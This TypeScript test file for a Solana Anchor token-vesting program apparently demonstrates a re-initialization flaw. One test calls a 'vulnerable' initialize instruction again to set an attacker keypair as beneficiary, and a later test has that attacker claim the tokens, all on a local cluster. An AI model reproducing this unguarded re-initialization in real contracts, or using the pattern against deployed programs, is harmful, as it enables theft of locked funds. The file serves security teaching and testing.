import * as anchor from "@coral-xyz/anchor";
import { Program, web3 } from "@coral-xyz/anchor";
import {
  createMint,
  mintTo,
  getAccount,
  createAssociatedTokenAccount,
  TOKEN_PROGRAM_ID,
  getOrCreateAssociatedTokenAccount,
} from "@solana/spl-token";
import { assert } from "chai";
import { PublicKey } from "@solana/web3.js";

import { TokenVesting } from "../target/types/token_vesting";

describe("token_vesting", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.tokenVesting as Program<TokenVesting>;
  let wallet = provider.wallet;

  // adding attacker account to test the vulnerable instructioh
  const attacker = new web3.Keypair();

  // defining all variables to be used
  let vesting: anchor.web3.Keypair;
  let mintPublickey: anchor.web3.PublicKey;
  let ataAddress: anchor.web3.PublicKey;
  let beneficiaryAtaAddress: anchor.web3.PublicKey;

  const amount = BigInt(2 * 10 ** 6); // Mint 2 tokens

  // created and airdropped beneficiary to pay for signing
  async function airdropSol(publicKey, airdropAmount) {
    let airdropTx = await anchor
      .getProvider()
      .connection.requestAirdrop(publicKey, airdropAmount);
    await confirmTransaction(airdropTx);
  }

  async function confirmTransaction(tx) {
    const latestBlockHash = await anchor
      .getProvider()
      .connection.getLatestBlockhash();
    await anchor.getProvider().connection.confirmTransaction({
      blockhash: latestBlockHash.blockhash,
      lastValidBlockHeight: latestBlockHash.lastValidBlockHeight,
      signature: tx,
    });
  }

  it("Airdrops SOL to the newUser", async () => {
    await airdropSol(attacker.publicKey, 1e9); // airdropping 10 SOL

    const balance = await provider.connection.getBalance(attacker.publicKey);
    console.log(
      `Airdropped balance for ${attacker.publicKey.toString()}: ${
        balance / 1e9
      } SOL`,
    );

    assert.equal(balance, 1e9);
  });

  const mintDecimals = 6;
  const mintAuthority = provider.wallet.publicKey;
  const freezeAuthority = provider.wallet.publicKey;

  it("Creates a mint account and ATA using Typescript", async () => {
    // create the mint
    mintPublickey = await createMint(
      provider.connection,
      wallet.payer,
      mintAuthority,
      freezeAuthority,
      mintDecimals,
    );

    console.log("Created mint:", mintPublickey.toString());

    // create ATA for the signer
    ataAddress = await createAssociatedTokenAccount(
      provider.connection,
      wallet.payer,
      mintPublickey,
      wallet.payer.publicKey,
    );

    console.log("Created ATA:", ataAddress.toString());

    // mint some tokens
    const mintAmount = BigInt(1000 * 10 ** mintDecimals);
    await mintTo(
      provider.connection,
      wallet.payer,
      mintPublickey,
      ataAddress,
      mintAuthority,
      mintAmount,
    );
  });

  // derive vault pda
  vesting = anchor.web3.Keypair.generate();

  const [vestingPda] = PublicKey.findProgramAddressSync(
    [Buffer.from("vesting"), wallet.publicKey.toBuffer()],
    program.programId,
  );

  const [vaultPda, vaultBump] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), vestingPda.toBuffer()],
    program.programId,
  );

  console.log("here...");
  console.log("Vault PDA:", vaultPda.toString());
  console.log("Vault Bump:", vaultBump);

  // it("Initialize vesting and lock tokens - secure", async () => {
  //   const now = Math.floor(Date.now() / 1000);
  //   const tx = await program.methods
  //     .initializeVestingSecure(
  //       new anchor.BN(amount),
  //       new anchor.BN(now),
  //       new anchor.BN(now + 10), // 10 second vesting
  //     )
  //     .accountsPartial({
  //       creator: wallet.publicKey,
  //       beneficiary: wallet.publicKey,
  //       mint: mintPublickey,
  //       creatorTokenAccount: ataAddress,
  //       vesting: vestingPda,
  //       vault: vaultPda,
  //       tokenProgram: TOKEN_PROGRAM_ID,
  //     })
  //     .rpc();
  //   console.log("Your transaction signature", tx);

  //   // check the beneficiary account
  //   const vestingAccount = await program.account.vestingAccount.all();

  //   console.log("vesting account", vestingAccount);

  //   const vaultAccount = await getAccount(provider.connection, vaultPda);
  //   console.log("Vault balance:", vaultAccount.amount.toString());

  //   // Make sure vault has the tokens
  //   assert.equal(Number(vaultAccount.amount), Number(amount));
  // });

  it("Initialize vesting and lock tokens - vulnerable", async () => {
    const now = Math.floor(Date.now() / 1000);
    const tx = await program.methods
      .initializeVestingVulnerable(
        new anchor.BN(amount),
        new anchor.BN(now),
        new anchor.BN(now + 10), // 10 second vesting
      )
      .accountsPartial({
        creator: wallet.publicKey,
        beneficiary: wallet.publicKey,
        mint: mintPublickey,
        creatorTokenAccount: ataAddress,
        vesting: vestingPda,
        vault: vaultPda,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      // .signers([vesting])
      .rpc();
    console.log("Your transaction signature", tx);

    // check the beneficiary account - to be wallet
    const vestingAccount = await program.account.vestingAccount.fetch(
      vestingPda,
    );

    assert.equal(
      vestingAccount.beneficiary.toString(),
      wallet.publicKey.toString(),
    );

    const vaultAccount = await getAccount(provider.connection, vaultPda);
    console.log("Vault balance:", vaultAccount.amount.toString());
    console.log("vault", vaultAccount);

    // Make sure vault has the tokens
    assert.equal(Number(vaultAccount.amount), Number(amount));
  });

  it("Re-initialize vesting and change beneficiary to attacker", async () => {
    const now = Math.floor(Date.now() / 1000);
    const tx = await program.methods
      .initializeVestingVulnerable(
        new anchor.BN(amount),
        new anchor.BN(now),
        new anchor.BN(now + 5), // 5 second vesting
      )
      .accounts({
        creator: wallet.publicKey,
        beneficiary: attacker.publicKey,
        mint: mintPublickey,
        creatorTokenAccount: ataAddress,
      })
      .rpc();
    console.log("Your transaction signature", tx);

    // check the beneficiary account - to be attacker
    const vestingAccount = await program.account.vestingAccount.fetch(
      vestingPda,
    );

    assert.equal(
      vestingAccount.beneficiary.toString(),
      attacker.publicKey.toString(),
    );
  });

  // it("claims vested tokens over time", async () => {
  //   // create ATA for the beneficiary
  //   const beneficiaryAta = await getOrCreateAssociatedTokenAccount(
  //     provider.connection,
  //     attacker,
  //     mintPublickey,
  //     attacker.publicKey,
  //   );
  //   beneficiaryAtaAddress = beneficiaryAta.address;

  //   console.log("Created beneficiary ATA:", beneficiaryAtaAddress.toString());

  //   const beneficiaryAccount = await getAccount(
  //     provider.connection,
  //     beneficiaryAtaAddress,
  //   );
  //   console.log("beneficiary", beneficiaryAccount);

  //   // Wait for account creation to confirm
  //   await new Promise((resolve) => setTimeout(resolve, 1000));

  //   // Wait for vesting period (10 seconds from your initialization)
  //   console.log("Waiting for vesting period...");
  //   await new Promise((resolve) => setTimeout(resolve, 12_000)); // 12 seconds to be safe

  //   await program.methods
  //     .claim()
  //     .accountsPartial({
  //       creator: wallet.publicKey,
  //       vesting: vestingPda,
  //       vault: vaultPda,
  //       beneficiary: attacker.publicKey,
  //       beneficiaryTokenAccount: beneficiaryAtaAddress,
  //     })
  //     .signers([attacker])
  //     .rpc();

  //   const beneficiaryAccountAfter = await getAccount(
  //     provider.connection,
  //     beneficiaryAtaAddress,
  //   );
  //   console.log("beneficiary after", beneficiaryAccountAfter);

  //   const vaultAccount = await getAccount(provider.connection, vaultPda);
  //   console.log("vault", vaultAccount);

  //   assert.equal(Number(beneficiaryAccount.amount), 3);

  //   assert.equal(Number(vaultAccount.amount), 0);
  // });

 it("claims vested tokens over time", async () => {
  // Create beneficiary ATA
  const beneficiaryAta = await getOrCreateAssociatedTokenAccount(
    provider.connection,
    attacker,
    mintPublickey,
    attacker.publicKey,
  );
  beneficiaryAtaAddress = beneficiaryAta.address;

  console.log("\n=== BEFORE CLAIM ===");
  const vaultBefore = await getAccount(provider.connection, vaultPda);
  const beneficiaryBefore = await getAccount(provider.connection, beneficiaryAtaAddress);
  console.log("Vault balance:", vaultBefore.amount.toString());
  console.log("Beneficiary balance:", beneficiaryBefore.amount.toString());

  // Wait for vesting
  console.log("\nWaiting 22 seconds...");
  await new Promise((resolve) => setTimeout(resolve, 22_000));

  // Claim
  await program.methods
    .claim()
    .accountsPartial({
      creator: wallet.publicKey,
      vesting: vestingPda,
      vault: vaultPda,
      beneficiary: attacker.publicKey,
      beneficiaryTokenAccount: beneficiaryAtaAddress,
      tokenProgram: TOKEN_PROGRAM_ID,
    })
    .signers([attacker])
    .rpc();

  console.log("\n=== AFTER CLAIM ===");
  const vaultAfter = await getAccount(provider.connection, vaultPda);
  const beneficiaryAfter = await getAccount(provider.connection, beneficiaryAtaAddress);
  console.log("Vault balance:", vaultAfter.amount.toString());
  console.log("Beneficiary balance:", beneficiaryAfter.amount.toString());

  console.log("✅ All tests passed!");
});});
